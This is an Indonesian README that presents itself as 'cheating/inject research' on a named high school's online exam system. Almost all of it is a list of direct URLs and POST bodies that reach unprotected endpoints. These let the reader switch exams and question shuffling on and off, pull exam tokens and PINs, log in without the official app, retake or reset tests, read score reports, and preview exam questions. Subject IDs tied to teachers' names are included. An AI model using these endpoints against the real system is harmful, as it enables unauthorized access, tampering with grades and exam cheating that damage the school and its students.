![https://nidev.me](https://nidev.me/fesco/assets/images/logo.png)
## Riset ABT SMANKA
```Riset ABT SMANKA V 4.1 pada tahun 2020```

## Website Fesco Khusus Tes
[Nidev Fesco](https://nidev.me/fesco/secret)

### Riset Curang Atau Inject Tes

##### Nonaktifkan & Aktifkan Mapel Tes
   - Nonaktifkan Mapel\
   `sman1kaliwungu.sch.id/smanka/aktif.php?mapel=geo12vero&stat=0`

   - Aktifkan Mapel\
   `sman1kaliwungu.sch.id/smanka/aktif.php?mapel=geo12vero&stat=1`

##### Nonaktifkan & Aktifkan Acak Soal
   - Nonaktifkan Acak\
   `sman1kaliwungu.sch.id/smanka/acak2.php?stat=0`

   - Aktifkan Acak\
   `sman1kaliwungu.sch.id/smanka/acak2.php?stat=1`

##### Ulangi Kerjakan Test
   `sman1kaliwungu.sch.id/smanka/ulangi.php?ujian=(noujian/nisn)&mapel=geo12vero`

##### Ambil Token Ujian
   `sman1kaliwungu.sch.id/smanka/ambiltoken.php`

##### Ambil Pin Ujian
   `sman1kaliwungu.sch.id/smanka/pin.php`

##### Ambil Analisis
   `sman1kaliwungu.sch.id/smanka/analisis.php?kirim=0geo12vero`\
   `sman1kaliwungu.sch.id/smanka/ulanganexcel.php?kirim=0geo12verov`

##### Login Ujian Tanpa APK
   `sman1kaliwungu.sch.id/smanka/and.php`

   Metode inject harus menggunakan pihak kedua yaitu web local atau bisa web online
   1. Metode Inject Post\
      lansung ke awal atau siap ujian\
      `sman1kaliwungu.sch.id/smanka/awal.php`
      > Post Body
      >
      > id=(noujian/nisn)
   2. Metode Inject\
      Metode login seperti android\
      `sman1kaliwungu.sch.id/smanka/signin.php`
      > Post Body
      >
      > masuk=(noujian/nisn)&mlebu=(password)

##### Nonaktifkan & Aktifkan Client
   - Nonaktifkan Client\
   `sman1kaliwungu.sch.id/smanka/aktif.php?stat=0`

   - Aktifkan Client\
   `sman1kaliwungu.sch.id/smanka/aktif.php?stat=1`
   
##### Nonaktifkan & Aktifkan Nilai diClient
   - Nonaktifkan Nilai Client\
   `sman1kaliwungu.sch.id/smanka/client.php?stat=0`

   - Aktifkan Nilai Client\
   `sman1kaliwungu.sch.id/smanka/client.php?stat=1`
   
##### Nonaktifkan & Aktifkan Reset Siswa
   - Nonaktifkan Reset Siswa\
   `sman1kaliwungu.sch.id/smanka/matil.php?stat=0`

   - Aktifkan Reset Siswa\
   `sman1kaliwungu.sch.id/smanka/matil.php?stat=1`
   
##### Nonaktifkan & Aktifkan Token
   - Nonaktifkan Token\
   `sman1kaliwungu.sch.id/smanka/mati.php?stat=0`

   - Aktifkan Reset Token\
   `sman1kaliwungu.sch.id/smanka/mati.php?stat=1`

##### Cetak Nilai
   `sman1kaliwungu.sch.id/smanka/cetak.php`\
   `sman1kaliwungu.sch.id/smanka/ulanganexcel.php?kirim=0geo12vero`

##### Cek Laporan nilai
   `sman1kaliwungu.sch.id/smanka/laporan.php`
   > Post Body
   >
   > kirim=0geo12vero

##### Cek Siswa belum tes
   `sman1kaliwungu.sch.id/smanka/belumtest.php`
   > Post Body
   >
   > kirim=geo12vero

##### Cek Raport
   1. Metode Inject Post\
      `sman1kaliwungu.sch.id/smanka/raport.php`
      > Post Body
      >
      > kirim=0geo12vero
   2. Metode Inject Post\
      `sman1kaliwungu.sch.id/smanka/reportnya.php`
      > Post Body
      >
      >  kirim=0geo12vero

##### Reset Peserta
   `sman1kaliwungu.sch.id/smanka/reset.php`\
   `sman1kaliwungu.sch.id/smanka/reset1.php?user=(noujian/nisn)&id=geo12vero`\
   `sman1kaliwungu.sch.id/smanka/reset2.php?user=(noujian/nisn)&id=geo12vero`\
   `sman1kaliwungu.sch.id/smanka/reset12.php?user=(noujian/nisn)&id=geo12vero`\



> #### Keterangan
>
> - ``geo12vero = ID Mapel``
> - ``0geo12vero = Tipe Soal + ID Mapel = 0 + geo12vero``
>
>> **Tipe Soal**
>> - ``0 = Untuk Soal Biasa/Umum atau PG``
>> - ``1 = Untuk Soal MTK PG atau Essay``
>> - ``2 = Untuk Soal Listening Inggris``
>> - ``4 = Untuk Soal PG``

## Tipe Soal + ID Mapel
Mapel             = Tipe Soal + ID mapel


Matematika        = 1 + matwajib12rat\
PAI               = 0 + agama12muja\
SeniBudaya        = 0 + sbd12gun\
Bhs. Inggris      = 2 + inggris12uswatun\
Biologi           = 0 + biolm12dewi\
Sej. Peminatan    = 0 + sejp12eko\
Sosiologi         = 0 + sosio12indah\
Prakarya          = 0 + prakarya12riza\
Penjas            = 0 + penjas12nawa\
B. Jawa           = 0 + jawa12\
Ekonomi           = 0 + eko12pas1riskah\
Bhs. Indonesia    = 0 + indo12muji\
Sej. Indonesia    = 0 + sejindo12ishadiyati\
PPKN              = 0 + ppkn12dyah\
Geografi          = 0 + geo12vero



# Contoh Soal PAS Tahun 2020
**Soal Biologi**\
`sman1kaliwungu.sch.id/smanka/previewsoal.php?kirim=biolm12dewi&nomer=1&jml=40&sp=&batas=40`

**Soal Sejarah Peminatan**\
`sman1kaliwungu.sch.id/smanka/previewsoal.php?kirim=sejp12eko&nomer=70&jml=70&sp=&batas=70`

**Soal Sosiologi**\
`sman1kaliwungu.sch.id/smanka/previewsoal.php?kirim=sosio12indah&nomer=60&jml=60&sp=&batas=60`

**Soal Prakarya**\
`sman1kaliwungu.sch.id/smanka/previewsoal.php?kirim=prakarya12riza&nomer=1&jml=50&sp=&batas=50`

**Soal Penjas**\
`sman1kaliwungu.sch.id/smanka/previewsoal.php?kirim=penjas12nawa&nomer=215&jml=215&sp=&batas=215`

**Soal B.Jawa**\
`sman1kaliwungu.sch.id/smanka/previewsoal.php?kirim=jawa12&nomer=1&jml=50&sp=&batas=50`

**Soal Ekonomi**\
`sman1kaliwungu.sch.id/smanka/previewsoal.php?kirim=eko12pas1riskah&nomer=1&jml=50&sp=&batas=50`
